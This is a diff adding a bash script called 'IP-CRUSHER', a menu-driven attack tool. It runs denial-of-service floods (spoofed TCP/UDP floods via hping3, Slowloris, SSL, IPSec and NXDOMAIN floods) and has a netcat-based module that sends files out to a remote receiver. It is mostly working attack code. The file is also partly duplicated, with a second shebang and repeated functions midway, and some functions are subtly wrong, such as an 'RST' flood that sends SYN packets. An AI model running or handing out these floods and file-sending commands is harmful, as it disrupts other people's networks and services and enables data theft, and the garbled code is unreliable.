@@ -1,0 +1,417 @@
+#!/bin/bash
+########################
+## Helper Functions ##
+########################
+
+validate_int() {
+    local VAR="$1"
+    local DEFAULT="$2"
+    if ! [[ "$VAR" =~ ^[0-9]+$ ]]; then
+        echo "$DEFAULT"
+    else
+        echo "$VAR"
+    fi
+}
+
+validate_port() {
+    local PORT="$1"
+    local DEFAULT="$2"
+    if ! [[ "$PORT" =~ ^[0-9]+$ ]] || [ "$PORT" -lt 1 ] || [ "$PORT" -gt 65535 ]; then
+        echo "$DEFAULT"
+    else
+        echo "$PORT"
+    fi
+}
+
+########################
+## Main Menu ##
+########################
+
+mainmenu() {
+    PS3="IP-CRUSHER> "
+    options=("Recon" "DOS" "Extraction" "View Readme" "Quit")
+    select opt in "${options[@]}"; do
+        case $opt in
+            "Recon") echo "Recon module selected..." ;;
+            "DOS") dosmenu ;;
+            "Extraction") extractionmenu ;;
+            "View Readme") showreadme ;;
+            "Quit") echo "Exiting..."; exit 0 ;;
+            *) echo "Invalid option." ;;
+        esac
+    done
+}
+
+########################
+## DOS Menu ##
+########################
+
+dosmenu() {
+    options=("TCP RST Flood" "TCP XMAS Flood" "UDP Flood" "SSL DOS" "Slowloris" "IPSec DOS" "Distraction Scan" "NXDOMAIN Flood" "Back")
+    select opt in "${options[@]}"; do
+        case $opt in
+            "TCP RST Flood") tcprstflood ;;
+            "TCP XMAS Flood") xmasflood ;;
+            "UDP Flood") udpflood ;;
+            "SSL DOS") ssldos ;;
+            "Slowloris") slowloris ;;
+            "IPSec DOS") ipsecdos ;;
+            "Distraction Scan") distractionscan ;;
+            "NXDOMAIN Flood") nxdomainflood ;;
+            "Back") mainmenu ;;
+            *) echo "Invalid option." ;;
+        esac
+    done
+}
+
+########################
+## TCP RST Flood ##
+########################
+
+tcprstflood() {
+    echo "TCP RST Flood uses hping3..."
+    read -p "Enter target IP/hostname: " TARGET
+    read -p "Enter target port (default 80): " PORT
+    PORT=$(validate_port "$PORT" 80)
+    read -p "Enter Source IP or [i] for interface: " SOURCE
+    SOURCE=${SOURCE:-i}
+    read -p "Send data with packet? [y/n] (default n): " SENDDATA
+    SENDDATA=${SENDDATA:-n}
+    if [[ "$SENDDATA" == "y" ]]; then
+        read -p "Enter number of data bytes (default 3000): " DATA
+        DATA=$(validate_int "$DATA" 3000)
+    else
+        DATA=0
+    fi
+
+    echo "Starting TCP RST Flood..."
+    if command -v hping3 >/dev/null; then
+        if [[ "$SOURCE" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+            sudo hping3 --flood -d $DATA -S $TARGET -p $PORT
+        elif [ "$SOURCE" = "r" ]; then
+            sudo hping3 --flood -d $DATA -S $TARGET -p $PORT --rand-source
+        else
+            sudo hping3 -d $DATA -S $TARGET -p $PORT
+        fi
+    else
+        echo "hping3 not found, using nping..."
+        read -p "Enter number of packets per second (default 10000): " RATE
+        RATE=$(validate_int "$RATE" 10000)
+        read -p "Enter total packets to send (default 100000): " TOTAL
+        TOTAL=$(validate_int "$TOTAL" 100000)
+        if [ "$SOURCE" = "i" ]; then
+            sudo nping --tcp --dest-port $PORT --rate $RATE --count $TOTAL $TARGET
+        else
+            sudo nping --tcp --dest-port $PORT --rate $RATE --count $TOTAL $TARGET --source-ip $SOURCE
+        fi
+    fi
+}
+
+########################
+## TCP XMAS Flood ##
+########################
+
+xmasflood() {
+    echo "TCP XMAS Flood uses hping3..."
+    read -p "Enter target IP/hostname: " TARGET
+    read -p "Enter target port (default 80): " PORT
+    PORT=$(validate_port "$PORT" 80)
+    read -p "Enter Source IP or [i] for interface: " SOURCE
+    SOURCE=${SOURCE:-i}
+    read -p "Send data with packet? [y/n] (default n): " SENDDATA
+    SENDDATA=${SENDDATA:-n}
+    if [[ "$SENDDATA" == "y" ]]; then
+        read -p "Enter number of data bytes (default 3000): " DATA
+        DATA=$(validate_int "$DATA" 3000)
+    else
+        DATA=0
+    fi
+
+    echo "Starting TCP XMAS Flood..."
+    if command -v hping3 >/dev/null; then
+        if [[ "$SOURCE" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+            sudo hping3 --flood -d $DATA -X $TARGET -p $PORT
+        elif [ "$SOURCE" = "r" ]; then
+            sudo hping3 --flood -d $DATA -X $TARGET -p $PORT --rand-source
+        else
+            sudo hping3 -d $DATA -X $TARGET -p $PORT
+        fi
+    else
+        echo "hping3 not found, using nping..."
+        read -p "Enter number of packets per second (default 10000): " RATE
+        RATE=$(validate_int "$RATE" 10000)
+        read -p "Enter total packets to send (default 100000): " TOTAL
+        TOTAL=$(validate_int "$TOTAL" 100000)
+        if [ "$SOURCE" = "i" ]; then
+            sudo nping --tcp --dest-port $PORT --rate $RATE --count $TOTAL $TARGET
+        else
+            sudo nping --tcp --dest-port $PORT --rate $RATE --count $TOTAL $TARGET --source-ip $SOURCE
+        fi
+    fi
+}
+
+########################
+## UDP Flood ##
+########################
+
+udpflood() {
+    echo "UDP Flood uses hping3..."
+    read -p "Enter target IP/hostname: " TARGET
+    read -p "Enter target port (default 80): " PORT
+    PORT=$(validate_port "$PORT" 80)
+    read -p "Enter Source IP or [i] for interface: " SOURCE
+    SOURCE=${SOURCE:-i}
+    read -p "Enter string to send (data): " DATA
+
+    echo "Starting UDP Flood..."
+    if command -v hping3 >/dev/null; then
+        if [[ "$SOURCE" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+            sudo hping3 --flood --spoof $SOURCE --udp -d ${#DATA} $TARGET -p $PORT --sign $DATA
+        elif [ "$SOURCE" = "r" ]; then
+            sudo hping3 --flood --rand-source --udp -d ${#DATA} $TARGET -p $PORT --sign $DATA
+        else
+            sudo hping3 --flood --udp -d ${#DATA} $TARGET -p $PORT --sign $DATA
+        fi
+    else
+        echo "hping3 not found, using nping..."
+        read -p "Enter number of packets per second (default 10000): " RATE
+        RATE=$(validate_int "$RATE" 10000)
+        read -p "Enter total packets to send (default 100000): " TOTAL
+        TOTAL=$(validate_int "$TOTAL" 100000)
+        if [ "$SOURCE" = "i" ]; then
+            sudo nping --udp --dest-port $PORT --rate $RATE --count $TOTAL $TARGET
+        else
+            sudo nping --udp --dest-port $PORT --rate $RATE --count $TOTAL $TARGET --source-ip $SOURCE
+        fi
+    fi
+}
+
+########################
+## SSL DOS ##
+########################
+
+ssldos() {
+    echo "SSL/TLS DOS attack using openssl..."
+    read -p "Enter target IP/hostname: " TARGET
+    read -p "Enter target port (default 443): " PORT
+    PORT=$(validate_port "$PORT" 443)
+    read -p "Use client renegotiation? [y/n] (default n): " NEGOTIATE
+    NEGOTIATE=${NEGOTIATE:-n}
+
+    echo "Launching SSL DOS..."
+    for i in {1..10}; do
+        if [ "$NEGOTIATE" = "y" ]; then
+            openssl s_client -connect $TARGET:$PORT -reconnect </dev/null &
+        else
+            openssl s_client -connect $TARGET:$PORT </dev/null &
+        fi
+    done
+}
+
+########################
+## Slowloris ##
+########################
+
+slowloris() {
+    echo "Slowloris attack using netcat..."
+    read -p "Enter target IP/hostname: " TARGET
+    read -p "Enter target port (default 80): " PORT
+    PORT=$(validate_port "$PORT" 80)
+    read -p "Number of connections (default 2000): " CONNS
+    CONNS=$(validate_int "$CONNS" 2000)
+    read -p "Interval between headers [r=random, default r]: " INTERVAL
+    INTERVAL=${INTERVAL:-r}
+    if [[ "$INTERVAL" = "r" ]]; then
+        INTERVAL=$((RANDOM % 11 + 5))
+    fi
+
+    echo "Launching Slowloris..."
+    for i in $(seq 1 $CONNS); do
+        echo "HEAD / HTTP/1.1\r\nHost: $TARGET\r\n" | nc $TARGET $PORT &
+        sleep $INTERVAL
+    done
+}
+
+########################
+## IPSec DOS ##
+########################
+
+ipsecdos() {
+    echo "IPSec DOS using ike-scan..."
+    read -p "Enter target IP/hostname: " TARGET
+    echo "Launching IPSec DOS..."
+    while :; do
+        sudo ike-scan -A -B 100M -t 1 --sourceip=r $TARGET
+    done
+}
+
+########################
+## Distraction Scan ##
+########################
+
+distractionscan() {
+    echo "Distraction scan..."
+    read -p "Enter target IP: " TARGET
+    read -p "Enter spoofed source IP: " SOURCE
+    for i in {1..50}; do
+        echo "Scan $i..." &
+    done
+}
+
+########################
+## NXDOMAIN Flood ##
+########################
+
+nxdomainflood() {
+    echo "NXDOMAIN flood against DNS..."
+    read -p "Enter target DNS IP: " DNSTARGET
+    while :; do
+        TRANS=$RANDOM
+        printf -v TRANSID "%04x" "$TRANS"
+        TLDLIST=(com br net org cz au co jp cn ru in us uk)
+        TLD=${TLDLIST[RANDOM % ${#TLDLIST[@]}]}
+        STRING=$(< /dev/urandom tr -dc [:alnum:] | head -c $((RANDOM % 20 + 1)))
+        STRINGLEN=${#STRING}
+        printf -v STRINGLENHEX "%02x" $STRINGLEN
+        TLDLEN=${#TLD}
+        printf -v TLDLENHEX "%02x" $TLDLEN
+        ATTACKSTRING="\x${TRANSID:0:2}\x${TRANSID:2:2}\x01\x00$STRING$TLD"
+        echo -n -e $ATTACKSTRING | nc -u -w0 $DNSTARGET 53
+    done
+}
+
+########################
+## Extraction Menu ##
+########################
+
+extractionmenu() {
+    options=("Send File" "Create Listener" "Go back")
+    select extractopt in "${options[@]}"; do
+        case $extractopt in
+            "Send File") sendfile ;;
+            "Create Listener") listener ;;
+            "Go back") mainmenu ;;
+            *) echo "Invalid option." ;;
+        esac
+    done
+}
+
+sendfile() {
+    read -p "Protocol [t/u] (default t): " PROTO
+    PROTO=${PROTO:-t}
+    read -p "Receiver IP: " RECEIVER
+    read -p "Destination port (default 80): " PORT
+    PORT=$(validate_port "$PORT" 80)
+    read -p "Full path of file to send: " EXTRACT
+
+    echo "Sending file to $RECEIVER:$PORT..."
+    if [ "$PROTO" = "t" ]; then
+        nc -w 3 -n -N $RECEIVER $PORT < $EXTRACT
+    else
+        nc -n -N -u $RECEIVER $PORT < $EXTRACT
+    fi
+
+    echo "Generating hashes..."
+    md5sum $EXTRACT
+    sha512sum $EXTRACT
+}
+
+listener() {
+    read -p "Protocol [t/u] (default t): " PROTO
+    PROTO=${PROTO:-t}
+    read -p "Port to listen on (default 8000): " PORT
+    PORT=$(validate_port "$PORT" 8000)
+    read -p "Output file (default IP-CRUSHER.listener.out): " OUTFILE
+    OUTFILE=${OUTFILE:-IP-CRUSHER.listener.out}
+
+    echo "Listening on port $PORT (ctrl+c to stop)..."
+    if [ "$PROTO" = "t" ]; then
+        nc -n -l -v -p $PORT > $OUTFILE
+    else
+        nc -n -u -k -l -v -p $PORT > $OUTFILE
+    fi
+
+    echo "Done. Generating hashes..."
+    md5sum $OUTFILE
+    sha512sum $OUTFILE
+}
+
+########################
+## Show Readme ##
+########################
+
+showreadme() {
+    curl -s https://raw.githubusercontent.com/GinjaChris/pentmenu/master/README.md
+}
+
+########################
+## Welcome Message ##
+########################
+
+clear
+
+#!/bin/bash
+########################
+## Helper Functions ##
+########################
+
+validate_int() {
+    local VAR="$1"
+    local DEFAULT="$2"
+    if ! [[ "$VAR" =~ ^[0-9]+$ ]]; then
+        echo "$DEFAULT"
+    else
+        echo "$VAR"
+    fi
+}
+
+validate_port() {
+    local PORT="$1"
+    local DEFAULT="$2"
+    if ! [[ "$PORT" =~ ^[0-9]+$ ]] || [ "$PORT" -lt 1 ] || [ "$PORT" -gt 65535 ]; then
+        echo "$DEFAULT"
+    else
+        echo "$PORT"
+    fi
+}
+
+########################
+## Main Menu ##
+########################
+
+mainmenu() {
+    PS3=$'\e[1;36mIP-CRUSHER> \e[0m'
+    options=("Recon" "DOS" "Extraction" "View Readme" "Quit")
+    select opt in "${options[@]}"; do
+        case $opt in
+            "Recon") echo -e "\e[1;32mRecon module selected...\e[0m" ;;
+            "DOS") dosmenu ;;
+            "Extraction") extractionmenu ;;
+            "View Readme") showreadme ;;
+            "Quit") echo -e "\e[1;31mExiting...\e[0m"; exit 0 ;;
+            *) echo -e "\e[1;31mInvalid option.\e[0m" ;;
+        esac
+    done
+}
+
+########################
+## Welcome Message ##
+########################
+
+clear
+echo -e "\e[1;34m"
+echo "██╗██████╗        ██████╗██████╗ ██╗   ██╗███████╗██╗  ██╗███████╗██████╗ "
+echo "██║██╔══██╗      ██╔════╝██╔══██╗██║   ██║██╔════╝██║  ██║██╔════╝██╔══██╗"
+echo "██║██████╔╝█████╗██║     ██████╔╝██║   ██║███████╗███████║█████╗  ██████╔╝"
+echo "██║██╔═══╝ ╚════╝██║     ██╔══██╗██║   ██║╚════██║██╔══██║██╔══╝  ██╔══██╗"
+echo "██║██║           ╚██████╗██║  ██║╚██████╔╝███████║██║  ██║███████╗██║  ██║"
+echo "╚═╝╚═╝            ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
+echo -e "\e[0m"
+echo -e "\e[1;33mWelcome to IP-CRUSHER!\e[0m"
+
+echo ""
+
+
+echo "Welcome to IP-CRUSHER!"
+echo "Responsible use only."
+mainmenu
